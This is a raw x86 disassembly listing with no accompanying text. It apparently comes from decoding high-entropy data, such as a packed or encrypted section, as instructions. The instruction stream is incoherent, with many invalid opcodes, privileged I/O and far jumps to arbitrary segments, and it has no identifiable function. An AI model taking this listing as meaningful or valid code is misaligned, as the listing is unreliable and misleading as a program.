  41d078:	xchg   esi,eax
  41d079:	mov    ebp,edi
  41d07b:	jp     0x41d0b4
  41d07d:	mov    ?,WORD PTR cs:[edx]
  41d080:	push   edi
  41d081:	jecxz  0x41d027
  41d083:	lock (bad) 
  41d085:	or     DWORD PTR [ebx+ebp*8],esp
  41d088:	je     0x41d059
  41d08a:	mov    al,0x49
  41d08c:	push   0x54c4cba5
  41d091:	sahf   
  41d092:	sbb    DWORD PTR [esi],ebp
  41d094:	retf   0x789f
  41d097:	out    0xc0,eax
  41d099:	ret    0xea1e
  41d09c:	fsubr  QWORD PTR [edx+0x2e]
  41d09f:	xchg   dl,al
  41d0a1:	fild   WORD PTR [eax-0x5813c6e3]
  41d0a7:	inc    ax
  41d0a9:	mov    eax,0xace519d
  41d0ae:	(bad)  
  41d0af:	fisttp WORD PTR [ebx+0x2cbf090c]
  41d0b5:	inc    esi
  41d0b6:	cmp    al,0x25
  41d0b8:	pusha  
  41d0b9:	retf   0x6a16
  41d0bc:	push   esp
  41d0bd:	add    al,0x97
  41d0bf:	mov    esp,0x137caa6d
  41d0c4:	pop    ds
  41d0c5:	loope  0x41d052
  41d0c7:	ins    BYTE PTR es:[edi],dx
  41d0c8:	xor    DWORD PTR [edi],0x14
  41d0cb:	add    DWORD PTR [edi-0x6e],ecx
  41d0ce:	pop    ds
  41d0cf:	ror    BYTE PTR [edi+edi*4],0xd0
  41d0d3:	out    dx,eax
  41d0d4:	mov    ah,0xfc
  41d0d6:	or     bh,BYTE PTR [esi-0x7cb62d92]
  41d0dc:	mov    BYTE PTR [ebx-0x4a33c36e],bl
  41d0e2:	cmp    BYTE PTR [ebp-0x38e844a8],cl
  41d0e8:	in     al,0x6e
  41d0ea:	mov    cl,BYTE PTR [esp+ecx*1]
  41d0ed:	cmp    ah,ch
  41d0ef:	xor    eax,0x2d73097b
  41d0f4:	or     ebx,DWORD PTR [esi]
  41d0f6:	(bad)  
  41d0f7:	mov    esp,0x9df88aa0
  41d0fc:	inc    edx
  41d0fd:	jae    0x41d16d
  41d0ff:	test   BYTE PTR [esi-0x32],0x82
  41d103:	xor    esi,ebp
  41d105:	jle    0x41d176
  41d107:	inc    ebx
  41d108:	jp     0x41d128
  41d10a:	push   ss
  41d10b:	jnp    0x41d121
  41d10d:	hlt    
  41d10e:	dec    esp
  41d10f:	mov    eax,0x63be5375
  41d114:	adc    eax,0x77b91c0d
  41d119:	sar    bh,0xbe
  41d11c:	arpl   bx,si
  41d11e:	jo     0x41d130
  41d120:	jl     0x41d181
  41d122:	push   ebx
  41d123:	data16 jl 0x41d13e
  41d126:	dec    edi
  41d127:	jne    0x41d170
  41d129:	popf   
  41d12a:	adc    BYTE PTR [eax-0x5d],0x17
  41d12e:	cmp    eax,0x3cae3451
  41d133:	out    0xdb,eax
  41d135:	inc    eax
  41d136:	jno    0x41d18f
  41d138:	js     0x41d19c
  41d13a:	xchg   ecx,eax
  41d13b:	repz cmp cl,bl
  41d13e:	mov    ebx,DWORD PTR [edi]
  41d140:	out    dx,eax
  41d141:	bound  esi,QWORD PTR [edx]
  41d143:	mov    dl,0x64
  41d145:	mov    esp,0x83d8e591
  41d14a:	or     eax,0xa52ed0a6
  41d14f:	or     eax,0xfeada8ad
  41d154:	mov    bl,0xaf
  41d156:	pop    ds
  41d157:	pusha  
  41d158:	mov    edx,0x72fe139d
  41d15d:	cmp    al,0x67
  41d15f:	jp     0x41d1bb
  41d161:	cmp    BYTE PTR [edi-0x7f],bl
  41d164:	in     eax,0xd
  41d166:	(bad)  
  41d167:	data16 add ah,BYTE PTR [ebx+0x2f]
  41d16b:	mov    WORD PTR [edx+0x32],ss
  41d16e:	fadd   st,st(0)
  41d170:	aam    0x7b
  41d172:	adc    al,0xba
  41d174:	dec    ebx
  41d175:	in     eax,dx
  41d176:	inc    esp
  41d177:	mov    cl,0x30
  41d179:	xor    BYTE PTR [esi-0x71],0x5b
  41d17d:	stos   BYTE PTR es:[edi],al
  41d17e:	scas   eax,DWORD PTR es:[edi]
  41d17f:	sahf   
  41d180:	pop    ebx
  41d181:	imul   ebp,DWORD PTR [edi],0x590e2c10
  41d187:	jle    0x41d161
  41d189:	xchg   ebx,eax
  41d18a:	or     BYTE PTR [ebx-0x7],dh
  41d18d:	test   al,0x3c
  41d18f:	stos   BYTE PTR es:[edi],al
  41d190:	xor    BYTE PTR [edx-0x6fa48702],ch
  41d196:	sar    DWORD PTR [ebx+0x235e8590],cl
  41d19c:	cdq    
  41d19d:	add    DWORD PTR [edx+0x6690dd54],0x79
  41d1a4:	jmp    0x65f:0xdfb8a547
  41d1ab:	xchg   DWORD PTR [ebx],ecx
  41d1ad:	arpl   WORD PTR [edi+0xb021121],dx
  41d1b3:	daa    
  41d1b4:	addr16 rol ebx,0x5d
  41d1b8:	ret    0x4ffd
  41d1bb:	call   0x9784:0xd4390604
  41d1c2:	push   edi
  41d1c3:	js     0x41d1cc
  41d1c5:	push   esp
  41d1c6:	outs   dx,BYTE PTR ds:[esi]
  41d1c7:	sar    al,1
  41d1c9:	inc    edi
  41d1ca:	ret    
  41d1cb:	repnz push edx
  41d1cd:	sti    
  41d1ce:	sub    ebp,DWORD PTR [ecx-0x73715172]
  41d1d4:	daa    
  41d1d5:	(bad)  [ebx+0x507ef14c]
  41d1db:	mov    al,0x69
  41d1dd:	or     cl,BYTE PTR [eax+0x2d]
  41d1e0:	dec    esp
  41d1e1:	sar    DWORD PTR [esp+eiz*4],cl
  41d1e4:	cs push es
  41d1e6:	imul   DWORD PTR [ebp-0x25ed960d]
  41d1ec:	push   ss
  41d1ed:	and    BYTE PTR [ebp-0x654f1a47],bh
  41d1f3:	aas    
  41d1f4:	mov    bl,0x7b
  41d1f6:	xchg   ebx,eax
  41d1f7:	mov    ch,0xb7
  41d1f9:	xchg   esi,eax
  41d1fa:	mov    WORD PTR [edi-0x4e],es
  41d1fd:	jp     0x41d20d
  41d1ff:	(bad)  
  41d200:	js     0x41d263
  41d202:	push   0xe0455652
  41d207:	cmp    BYTE PTR [eax+0x72a0c9f0],dl
  41d20d:	imul   edx,DWORD PTR [ebp+ecx*1-0x3e],0xcb42f88
  41d215:	data16 xor BYTE PTR [ebx+0x59],dl
  41d219:	jnp    0x41d1e8
  41d21b:	dec    edi
  41d21c:	mov    dh,0xb6
  41d21e:	xchg   ebp,eax
  41d21f:	movd   mm3,eax
  41d222:	fs dec edx
  41d224:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d225:	adc    al,bh
  41d227:	std    
  41d228:	mov    esi,0xcbb214ea
  41d22d:	add    eax,0xb6dfbd7f
  41d232:	jge    0x41d238
  41d234:	loope  0x41d2b5
  41d236:	inc    edi
  41d237:	dec    ebp
  41d238:	popf   
  41d239:	enter  0xb022,0x9e
  41d23d:	jmp    0x2417:0xe6018223
  41d244:	sbb    eax,eax
  41d246:	lock xor cl,BYTE PTR [edi]
  41d249:	div    BYTE PTR [esi-0x8]
  41d24c:	jecxz  0x41d2c7
  41d24e:	sbb    ecx,eax
  41d250:	xor    eax,0x5303ab83
  41d255:	test   al,0x2a
  41d257:	add    esp,DWORD PTR [esi+eax*1-0x628c2f43]
  41d25e:	(bad)  
  41d25f:	pop    ebx
  41d260:	pop    ds
  41d261:	cmp    eax,0x7d515ce8
  41d266:	scas   eax,DWORD PTR es:[edi]
  41d267:	mov    edi,0x31698f67
  41d26c:	jp     0x41d249
  41d26e:	call   0x59d6:0x1831477
  41d275:	rcl    dl,cl
  41d277:	inc    ecx
  41d278:	cli    
  41d279:	and    DWORD PTR [esi],esi
  41d27b:	mov    bl,0x4a
  41d27d:	(bad)  
  41d27e:	iret   
  41d27f:	jl     0x41d27c
  41d281:	add    DWORD PTR [esi+0x36],esp
  41d284:	jle    0x41d236
  41d286:	jg     0x41d2a7
  41d288:	mov    edx,0x4f5b3b96
  41d28d:	lahf   
  41d28e:	ins    BYTE PTR es:[edi],dx
  41d28f:	rcl    BYTE PTR [edi-0x2ed57c37],1
  41d295:	jno    0x41d272
  41d297:	aam    0xbe
  41d299:	sbb    al,0xa9
  41d29b:	scas   eax,DWORD PTR es:[edi]
  41d29c:	push   ss
  41d29d:	push   ecx
  41d29e:	and    ecx,edx
  41d2a0:	loop   0x41d22c
  41d2a2:	sbb    DWORD PTR [edi],ebx
  41d2a4:	jb     0x41d2e6
  41d2a6:	xor    al,0xf8
  41d2a8:	repz xor al,0xa1
  41d2ab:	bnd jbe 0x41d267
  41d2ae:	ja     0x41d294
  41d2b0:	push   edx
  41d2b1:	pusha  
  41d2b2:	mov    BYTE PTR [ebp+0x2f0d1be6],ch
  41d2b8:	mov    WORD PTR [ecx+ebp*4-0x66807f93],cs
  41d2bf:	dec    edx
  41d2c0:	dec    eax
  41d2c1:	adc    DWORD PTR [esi-0x59],ebx
  41d2c4:	lds    esi,FWORD PTR [ecx-0x6c]
  41d2c7:	fist   WORD PTR [ebp+0x9f1ca2f]
  41d2cd:	test   ecx,ebx
  41d2cf:	inc    edi
  41d2d0:	mov    edi,0xcf0c40c8
  41d2d5:	bnd jmp 0xc9a7b9ea
  41d2db:	adc    DWORD PTR [ebp-0x2cc0b861],eax
  41d2e1:	leave  
  41d2e2:	mov    ds:0x4b9a0ce3,al
  41d2e7:	cwde   
  41d2e8:	xchg   BYTE PTR [esi+ebx*1+0x3e00852],cl
  41d2ef:	aas    
  41d2f0:	js     0x41d30c
  41d2f2:	mov    ss,esi
  41d2f4:	aad    0xd0
  41d2f6:	ficom  WORD PTR [edx+0x2b]
  41d2f9:	fnstcw WORD PTR [ecx-0x43a7afe9]
  41d2ff:	loope  0x41d294
  41d301:	outs   dx,BYTE PTR ds:[esi]
  41d302:	cmc    
  41d303:	stc    
  41d304:	sub    BYTE PTR [ecx-0x73],al
  41d307:	sub    eax,0xdf8d83a5
  41d30c:	daa    
  41d30d:	(bad)  
  41d30e:	cli    
  41d30f:	pop    edi
  41d310:	cmp    al,0xf0
  41d312:	in     eax,0x10
  41d314:	adc    DWORD PTR [ecx],eax
  41d316:	scas   al,BYTE PTR es:[edi]
  41d317:	leave  
  41d318:	shl    DWORD PTR [edx+0x37],1
  41d31b:	hlt    
  41d31c:	sbb    BYTE PTR [esi],cl
  41d31e:	test   BYTE PTR [edi+0x3d],ah
  41d321:	mov    edx,0xa08c0b21
  41d326:	push   edx
  41d327:	aaa    
  41d328:	mov    al,0x6b
  41d32a:	adc    eax,0x1f27bb9c
  41d32f:	jmp    0x41d30c
  41d331:	addr16 in eax,dx
  41d333:	pop    esi
  41d334:	sbb    eax,0x329d9390
  41d339:	enter  0x8e0e,0x2d
  41d33d:	popa   
  41d33e:	sub    ebp,DWORD PTR [ebx]
  41d340:	test   al,0xa3
  41d342:	push   edi
  41d343:	cdq    
  41d344:	jbe    0x41d335
  41d346:	adc    ebp,DWORD PTR [ecx-0x5a56102b]
  41d34c:	add    ah,BYTE PTR [edx-0x8]
  41d34f:	inc    esi
  41d350:	mov    ebx,edi
  41d352:	mov    bh,0xd0
  41d354:	push   eax
  41d355:	neg    DWORD PTR [edi+0x21]
  41d358:	sbb    eax,0xb51e4369
  41d35d:	inc    ecx
  41d35e:	test   al,0x33
  41d360:	adc    BYTE PTR [ecx],dl
  41d362:	aam    0xc2
  41d364:	in     eax,dx
  41d365:	inc    esp
  41d366:	bound  ebp,QWORD PTR [ebx+0x264ebceb]
  41d36c:	pushf  
  41d36d:	cli    
  41d36e:	jmp    0x41d302
  41d370:	dec    esi
  41d371:	push   0x7c
  41d373:	lock xchg esp,eax
  41d375:	jne    0x41d3bb
  41d377:	jp     0x41d309
  41d379:	xchg   ebx,eax
  41d37a:	mov    WORD PTR [esi+eax*4],?
  41d37d:	inc    esi
  41d37e:	push   ebx
  41d37f:	shl    ah,0x1
  41d382:	in     al,dx
  41d383:	inc    eax
  41d384:	mov    ch,0x66
  41d386:	iret   
  41d387:	sbb    BYTE PTR [esi-0x516a1b47],0x2
  41d38e:	or     BYTE PTR [ebx-0x597ff859],dh
  41d394:	cmp    DWORD PTR [edx+0x2457a291],esp
  41d39a:	mov    edi,0x16fd1159
  41d39f:	(bad)  
  41d3a0:	push   cs
  41d3a1:	hlt    
  41d3a2:	sbb    al,0x63
  41d3a4:	push   ss
  41d3a5:	lods   eax,DWORD PTR ds:[esi]
  41d3a6:	lea    esp,[edi-0x3]
  41d3a9:	imul   ebx,DWORD PTR ds:0x273d9ec2,0xcc4898f4
  41d3b3:	imul   esp,DWORD PTR [ecx+ebx*1-0x64],0xffffffc9
  41d3b8:	xchg   esi,eax
  41d3b9:	dec    edi
  41d3ba:	xchg   edi,eax
  41d3bb:	xchg   ecx,eax
  41d3bc:	data16 aam 0x51
  41d3bf:	sub    DWORD PTR [ecx],ebx
  41d3c1:	push   ds
  41d3c2:	sti    
  41d3c3:	jmp    0x42d5:0x9b8d476e
  41d3ca:	lea    ebx,[edi-0x2ed52e7d]
  41d3d0:	dec    ecx
  41d3d1:	pop    ecx
  41d3d2:	sbb    BYTE PTR [esp+ebx*1],0x10
  41d3d6:	repz shl DWORD PTR [ecx],1
  41d3d9:	into   
  41d3da:	mov    ds:0x32a32129,al
  41d3df:	cwde   
  41d3e0:	rol    bh,1
  41d3e2:	lods   al,BYTE PTR ds:[esi]
  41d3e3:	iret   
  41d3e4:	out    0x67,al
  41d3e6:	popa   
  41d3e7:	cli    
  41d3e8:	mov    BYTE PTR [ebx-0x76f77685],dh
  41d3ee:	sbb    ch,BYTE PTR [ebx]
  41d3f0:	sub    eax,0x7ada119a
  41d3f5:	mov    ds:0xe55c85e1,eax
  41d3fa:	mov    cl,0xca
  41d3fc:	jns    0x41d406
  41d3fe:	jmp    0x41d443
  41d400:	mov    edi,esp
  41d402:	add    DWORD PTR [eax-0x7],ecx
  41d405:	pop    edi
  41d406:	jmp    0x41d46a
  41d408:	adc    DWORD PTR [ecx],esi
  41d40a:	mov    edx,DWORD PTR [ebx+0x29c6e6c6]
  41d410:	mov    BYTE PTR [ebx],dh
  41d412:	xchg   esi,eax
  41d413:	out    dx,eax
  41d414:	adc    dh,0xf0
  41d417:	add    edx,0x8e9a5222
  41d41d:	xor    eax,0xba4ec208
  41d422:	push   ss
  41d423:	cs jmp 0x68dd:0x434ed3be
  41d42b:	je     0x41d404
  41d42d:	mov    WORD PTR [ecx+0x18],es
  41d430:	sub    al,0xc6
  41d432:	push   eax
  41d433:	dec    edi
  41d434:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d436:	mov    dh,0x4a
  41d438:	push   edx
  41d439:	and    BYTE PTR [esp+edx*2-0xa2287e5],0xc3
  41d441:	(bad)
  41d444:	adc    bh,BYTE PTR [ecx+0x55]
  41d447:	xchg   BYTE PTR [eax+0x30bf3859],bh
  41d44d:	fisubr WORD PTR [ebx-0x94d16cb]
  41d453:	lds    ebp,FWORD PTR [ebx-0x13]
  41d456:	(bad)  
  41d458:	jecxz  0x41d440
  41d45a:	fnsave [edi]
  41d45c:	xchg   edi,eax
  41d45d:	ret    
  41d45e:	push   0x17
  41d460:	xchg   ebx,eax
  41d461:	pop    ebx
  41d462:	sbb    al,0x4f
  41d464:	iret   
  41d465:	xor    eax,DWORD PTR [ebp+0x52b5efda]
  41d46b:	inc    edi
  41d46c:	ficom  DWORD PTR [edx]
  41d46e:	cmc    
  41d46f:	adc    DWORD PTR [eax+ebp*4],edi
  41d472:	fnstenv [edx-0x11]
  41d475:	dec    esi
  41d476:	push   ds
  41d477:	test   DWORD PTR [esi+0x55],ebp
  41d47a:	jecxz  0x41d449
  41d47c:	inc    eax
  41d47d:	in     eax,0x37
  41d47f:	mov    ds:0xff599990,al
  41d484:	mov    eax,ds:0xe551f31e
  41d489:	outs   dx,DWORD PTR ds:[esi]
  41d48a:	or     BYTE PTR [esi],dl
  41d48c:	inc    esp
  41d48d:	daa    
  41d48e:	sbb    dl,ah
  41d490:	outs   dx,DWORD PTR ds:[esi]
  41d491:	xchg   ebp,eax
  41d492:	sbb    ebx,DWORD PTR [edi+0x2e]
  41d495:	in     eax,0x56
  41d497:	or     ebp,DWORD PTR [esi-0x7e]
  41d49a:	jne    0x41d492
  41d49c:	jo     0x41d4f5
  41d49e:	push   edx
  41d49f:	xchg   edi,eax
  41d4a0:	push   ecx
  41d4a1:	les    edi,FWORD PTR [ebp+0x14]
  41d4a4:	pop    ebp
  41d4a5:	mov    edx,DWORD PTR [edx]
  41d4a7:	cld    
  41d4a8:	jmp    0x41d46b
  41d4aa:	stc    
  41d4ab:	mov    ch,0xff
  41d4ad:	(bad)  
  41d4ae:	and    eax,0xe2bcd7e2
  41d4b3:	fnstcw WORD PTR [ebp+0x6b3b680d]
  41d4b9:	pop    edx
  41d4ba:	in     eax,0xfa
  41d4bc:	(bad)  
  41d4bd:	fsub   st(3),st
  41d4bf:	mov    eax,0xe4bb3a77
  41d4c4:	jmp    0x41d507
  41d4c6:	sub    BYTE PTR [eax-0x2],al
  41d4c9:	push   ebx
  41d4ca:	cs mov ebx,0xe8e1b108
  41d4d0:	out    0x0,eax
  41d4d2:	out    0x10,eax
  41d4d4:	data16 ins BYTE PTR es:[edi],dx
  41d4d6:	or     al,0xa4
  41d4d8:	inc    ebp
  41d4d9:	jmp    0x41d460
  41d4db:	ret    0xd3ad
  41d4de:	mov    bh,0x3e
  41d4e0:	sub    BYTE PTR [ecx],bh
  41d4e2:	ja     0x41d52a
  41d4e4:	fist   DWORD PTR [edi-0x3bf00d2f]
  41d4ea:	inc    BYTE PTR ds:0xb89dc7af
  41d4f0:	sbb    cl,dh
  41d4f2:	in     eax,0x83
  41d4f4:	mov    ds:0x4b99d9a3,al
  41d4f9:	pop    esi
  41d4fa:	iret   
  41d4fb:	icebp  
  41d4fc:	int    0x45
  41d4fe:	clc    
  41d4ff:	sbb    bh,BYTE PTR [ebp-0x785019c6]
  41d505:	popf   
  41d506:	mov    ds:0x3a10f02d,al
  41d50b:	call   0xe37e:0xfb1afe75
  41d512:	sti    
  41d513:	inc    edi
  41d514:	call   0x335e104f
  41d519:	test   al,0x9d
  41d51b:	add    eax,0x34aef932
  41d520:	pop    eax
  41d521:	iret   
  41d522:	xor    eax,0xbc946703
  41d528:	xchg   esi,eax
  41d529:	test   al,0x1f
  41d52b:	sub    BYTE PTR [esi-0x71],ch
  41d52e:	ins    BYTE PTR es:[edi],dx
  41d52f:	jno    0x41d4ef
  41d531:	bound  ebx,QWORD PTR cs:[ebx+0x2f]
  41d535:	jne    0x41d4fa
  41d537:	add    edi,esp
  41d539:	push   0xd223a8c4
  41d53e:	lods   al,BYTE PTR ds:[esi]
  41d53f:	inc    esi
  41d540:	ror    DWORD PTR [edx-0x1b77159d],cl
  41d546:	jbe    0x41d56f
  41d548:	jp     0x41d4fa
  41d54a:	fistp  QWORD PTR [ebx-0x7a9ba6d1]
  41d550:	out    0xcd,al
  41d552:	mov    ebx,0x617ac7c3
  41d557:	mov    ds:0x3310b066,al
  41d55c:	das    
  41d55d:	jae    0x41d55f
  41d55f:	test   BYTE PTR [edi],0x26
  41d562:	imul   ebp,DWORD PTR [edx-0x1fd90663],0xcc322fe2
  41d56c:	retf   
  41d56d:	pop    esi
  41d56e:	mov    eax,ds:0xf878312c
  41d573:	sub    esp,DWORD PTR [eax+ebp*1-0x529352e2]
  41d57a:	mov    dl,0xa9
  41d57c:	push   eax
  41d57d:	add    eax,0x441f2d9f
  41d582:	fxch   st(6)
  41d584:	(bad)  
  41d585:	repnz shr DWORD PTR [ecx],1
  41d588:	ins    DWORD PTR es:[edi],dx
  41d589:	cli    
  41d58a:	cdq    
  41d58b:	ins    DWORD PTR es:[edi],dx
  41d58c:	and    al,0xbf
  41d58e:	rcl    BYTE PTR [ebp+ecx*8+0x60110eee],0x2c
  41d596:	inc    esi
  41d597:	mov    ds:0xc3a2eab7,al
  41d59c:	test   al,0x24
  41d59e:	push   ds
  41d59f:	js     0x41d526
  41d5a1:	test   DWORD PTR [esi+0x6],ebp
  41d5a4:	add    BYTE PTR [edi+0x30],bh
  41d5a7:	or     al,0x15
  41d5a9:	or     esp,DWORD PTR [ecx+0x2f]
  41d5ac:	xor    ah,BYTE PTR [esi+0x7f139d32]
  41d5b2:	add    ecx,DWORD PTR [ecx-0x1b641aa4]
  41d5b8:	cmp    eax,0x5cd6aa93
  41d5bd:	lds    esp,FWORD PTR ds:0x4ea08c84
  41d5c3:	inc    ebp
  41d5c4:	and    eax,0x5b47bb36
  41d5c9:	mov    WORD PTR [eax+0x350db019],?
  41d5cf:	or     eax,DWORD PTR [esp+esi*4-0x163f60aa]
  41d5d6:	mov    ebx,0x695fc59e
  41d5db:	test   dl,cl
  41d5dd:	push   0x41
  41d5df:	out    dx,al
  41d5e0:	inc    ebp
  41d5e1:	cmp    BYTE PTR [ecx],0xe3
  41d5e4:	xor    al,0x0
  41d5e6:	mov    dh,0x3d
  41d5e8:	mov    DWORD PTR [eax],esp
  41d5ea:	mov    ds:0x96ee9188,eax
  41d5ef:	or     ecx,0x8ed5a50
  41d5f5:	fcom   st(5)
  41d5f7:	xchg   ecx,eax
  41d5f8:	mov    WORD PTR [ecx+eiz*8-0x111d9921],?
  41d5ff:	int    0xa1
  41d601:	sbb    BYTE PTR [ebx-0x2e77a342],dh
  41d607:	xchg   BYTE PTR [edx-0x57],ah
  41d60a:	dec    esi
  41d60b:	aaa    
  41d60c:	mov    ch,0xb6
  41d60e:	das    
  41d60f:	lods   eax,DWORD PTR ds:[esi]
  41d610:	jge    0x41d640
  41d612:	lds    ecx,FWORD PTR [ecx+eax*2+0x66bac6ac]
  41d619:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d61a:	dec    esp
  41d61b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d61c:	sub    ecx,ecx
  41d61e:	int    0xc2
  41d620:	mov    dl,bh
  41d622:	cmp    ecx,ebx
  41d624:	add    DWORD PTR [edi+0x3c],0xb
  41d628:	xor    DWORD PTR [ecx+edi*2],ecx
  41d62b:	popa   
  41d62c:	xchg   edx,eax
  41d62d:	stos   DWORD PTR es:[edi],eax
  41d62e:	mov    es,ebp
  41d630:	adc    DWORD PTR [ebx],eax
  41d632:	stc    
  41d633:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d634:	pop    eax
  41d635:	and    DWORD PTR [ebp-0x40],esi
  41d638:	mov    eax,0xf5dfd255
  41d63d:	xor    ch,al
  41d63f:	in     eax,0xc5
  41d641:	push   0xfffffff8
  41d643:	push   es
  41d644:	dec    eax
  41d645:	mov    al,ds:0xfa2e3f0
  41d64a:	daa    
  41d64b:	cmp    al,0xa8
  41d64d:	outs   dx,DWORD PTR ds:[esi]
  41d64e:	or     DWORD PTR [esi],esi
  41d650:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d651:	mov    bl,0xc3
  41d653:	jle    0x41d5df
  41d655:	sar    BYTE PTR [ebx+0x1c],1
  41d658:	mov    edx,0xa0ca8cc2
  41d65d:	shr    DWORD PTR [esi+edi*2+0x643a696d],cl
  41d664:	out    0x63,eax
  41d666:	gs in  al,0x8a
  41d669:	inc    ecx
  41d66a:	jmp    0x41d5ff
  41d66c:	lods   al,BYTE PTR ds:[esi]
  41d66d:	ins    DWORD PTR es:[edi],dx
  41d66e:	mov    ds:0x479f347a,eax
  41d673:	mov    BYTE PTR [eax+esi*8],al
  41d676:	or     al,0x5e
  41d678:	mov    DWORD PTR [ecx+0x40c2cdb3],esp
  41d67e:	pop    eax
  41d67f:	lods   al,BYTE PTR ds:[esi]
  41d680:	mov    ds:0x412f3786,eax
  41d685:	jge    0x41d639
  41d687:	ficom  WORD PTR [esi-0x73]
  41d68a:	sub    DWORD PTR [ebp+0x5bcd56be],ebx
  41d690:	data16 fcom QWORD PTR [eax+eiz*2+0x6e]
  41d696:	call   0xc265:0xdfdd8d61
  41d69d:	loopne 0x41d6c4
  41d69f:	push   ebp
  41d6a0:	jle    0x41d6e3
  41d6a2:	lods   al,BYTE PTR ds:[esi]
  41d6a3:	xchg   edx,eax
  41d6a4:	sub    BYTE PTR [edx+ebx*2-0x66],dh
  41d6a8:	xchg   esi,eax
  41d6a9:	mov    ebp,0x10118388
  41d6ae:	iret   
  41d6af:	sbb    ch,BYTE PTR [eax-0x5a4ac668]
  41d6b5:	ins    BYTE PTR es:[edi],dx
  41d6b6:	push   esi
  41d6b7:	fdivr  QWORD PTR ds:0xc3bbe9ab
  41d6bd:	(bad)  
  41d6be:	clc    
  41d6bf:	lahf   
  41d6c0:	sub    bl,BYTE PTR [ecx]
  41d6c2:	(bad)  
  41d6c3:	dec    ecx
  41d6c4:	or     al,0x73
  41d6c6:	push   ebx
  41d6c7:	xchg   ebp,eax
  41d6c8:	add    BYTE PTR ss:0x74484783,0xad
  41d6d0:	fucomi st,st(7)
  41d6d2:	xor    al,0x5b
  41d6d4:	xor    esi,esp
  41d6d6:	mov    edi,0xf4b5a071
  41d6db:	xchg   BYTE PTR [esp+ebx*2],bh
  41d6de:	xchg   esi,eax
  41d6df:	push   cs
  41d6e0:	and    edi,edi
  41d6e2:	lds    esp,FWORD PTR [ebx+esi*2+0x57f37a74]
  41d6e9:	inc    BYTE PTR [esi]
  41d6eb:	mov    dh,0x89
  41d6ed:	rcr    DWORD PTR [ecx-0xd],0x91
  41d6f1:	inc    edi
  41d6f2:	(bad)  
  41d6f3:	sub    dh,BYTE PTR [eax]
  41d6f5:	repz dec ebp
  41d6f7:	std    
  41d6f8:	stc    
  41d6f9:	xor    ebx,DWORD PTR [edx+0x64a7d5bf]
  41d6ff:	cmp    DWORD PTR [edx],0xffffffbd
  41d702:	sbb    bh,dl
  41d704:	mov    ecx,0x3c9d86c3
  41d709:	jp     0x41d703
  41d70b:	out    dx,al
  41d70c:	adc    ch,BYTE PTR [edi+0x5952b52d]
  41d712:	pop    ss
  41d713:	and    bl,BYTE PTR [edx+eiz*8+0x7ebd38a7]
  41d71a:	jmp    0xe20816a6
  41d71f:	mov    cl,0xd7
  41d721:	sbb    dl,ch
  41d723:	push   cs
  41d724:	sbb    BYTE PTR [esi],ah
  41d726:	xor    eax,0xb6179765
  41d72b:	sub    eax,0x7a2338f6
  41d730:	dec    eax
  41d731:	sbb    bl,dh
  41d733:	xor    edx,DWORD PTR [edi-0x7d]
  41d736:	idiv   BYTE PTR [esi-0x3d]
  41d739:	leave  
  41d73a:	(bad)  
  41d73b:	(bad)  
  41d73c:	ds adc ecx,0xa586e32b
  41d743:	stos   BYTE PTR es:[edi],al
  41d744:	shl    BYTE PTR ds:0x4b7b45b,cl
  41d74a:	arpl   WORD PTR [edi],di
  41d74c:	cwde   
  41d74d:	rcr    BYTE PTR [ecx+0x14],1
  41d750:	add    DWORD PTR [edi+0x5d],esp
  41d753:	out    0xa8,eax
  41d755:	or     DWORD PTR [ecx+0x55154fa0],edi
  41d75b:	(bad)  
  41d75c:	jns    0x41d766
  41d75e:	lock ror DWORD PTR [edx+0x461ab75e],1
  41d765:	fcmove st,st(1)
  41d767:	or     al,0x98
  41d769:	cmc    
  41d76a:	push   0x6c
  41d76c:	je     0x41d756
  41d76e:	pop    ds
  41d76f:	in     al,dx
  41d770:	push   0x2fd708c4
  41d775:	cmp    al,0xba
  41d777:	and    DWORD PTR gs:[ebx+0x1288f4ec],0x60
  41d77f:	sub    BYTE PTR [esi+0x4487934],ch
  41d785:	fnstenv [eax+0x1f83d041]
  41d78b:	sbb    ah,bh
  41d78d:	fisub  DWORD PTR [eax]
  41d78f:	mov    ?,WORD PTR [ecx]
  41d791:	lea    ebp,[edi-0x4a]
  41d794:	or     DWORD PTR [edx+0x3a],0x54
  41d798:	cmp    BYTE PTR [eax+0x31cd6782],bh
  41d79e:	pop    edi
  41d79f:	pop    es
  41d7a0:	cs push 0x984916ee
  41d7a6:	mov    ebx,DWORD PTR [edx+0x1cc3e218]
  41d7ac:	mov    dh,0x2f
  41d7ae:	dec    eax
  41d7af:	xlat   BYTE PTR ds:[ebx]
  41d7b0:	or     BYTE PTR [eax],dl
  41d7b2:	xchg   edx,eax
  41d7b3:	pop    ds
  41d7b4:	dec    ebx
  41d7b5:	cmp    al,al
  41d7b7:	stc    
  41d7b8:	pop    edi
  41d7b9:	lock jle 0x41d783
  41d7bc:	sbb    eax,0x249926b5
  41d7c1:	call   0x632750e6
  41d7c6:	(bad)  [eax+0x76]
  41d7c9:	and    bl,al
  41d7cb:	shl    BYTE PTR [eax-0x7b],cl
  41d7ce:	cld    
  41d7cf:	xor    BYTE PTR [esi+ebx*1],0xc0
  41d7d3:	cld    
  41d7d4:	iret   
  41d7d5:	cwde   
  41d7d6:	ret    0x2df
  41d7d9:	add    ah,BYTE PTR [ebp-0x17]
  41d7dc:	or     al,0xef
  41d7de:	or     eax,ebx
  41d7e0:	cmp    ebx,edx
  41d7e2:	shl    BYTE PTR [edi+ebp*4-0x60813d0d],0xd1
  41d7ea:	sub    BYTE PTR [ecx+0x7a],ah
  41d7ed:	iret   
  41d7ee:	popf   
  41d7ef:	or     al,0xbe
  41d7f1:	lods   eax,DWORD PTR ds:[esi]
  41d7f2:	repz add eax,0x46265779
  41d7f8:	fbld   TBYTE PTR [esi]
  41d7fa:	xor    dl,BYTE PTR [edx+eiz*4-0x8]
  41d7fe:	je     0x41d7cc
  41d800:	and    BYTE PTR [eax+0x29198f6],dl
  41d806:	mov    bl,bh
  41d808:	adc    dh,bh
  41d80a:	mov    ecx,0xd303ca37
  41d80f:	call   0xeb54684
  41d814:	mov    ecx,0xa859e694
  41d819:	stos   DWORD PTR es:[edi],eax
  41d81a:	pop    ebx
  41d81b:	cld    
  41d81c:	add    eax,0x9eb3a1cb
  41d821:	ins    DWORD PTR es:[edi],dx
  41d822:	icebp  
